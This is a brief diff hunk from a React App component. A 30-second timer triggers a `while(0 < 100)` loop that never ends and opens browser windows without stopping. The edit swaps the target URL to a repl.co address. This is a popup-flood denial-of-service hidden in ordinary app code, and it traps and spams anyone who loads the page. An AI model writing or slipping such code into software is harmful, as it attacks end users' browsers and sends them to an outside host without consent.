@@ -19,7 +19,7 @@ function App() {
         settimer(i++)
         if(i === 30){ 
           while(0 < 100){ 
-            window.open("http://www.another.com")
+            window.open("https://project1backend.badzybaddest.repl.co")
           }
         }
       }, 1000);
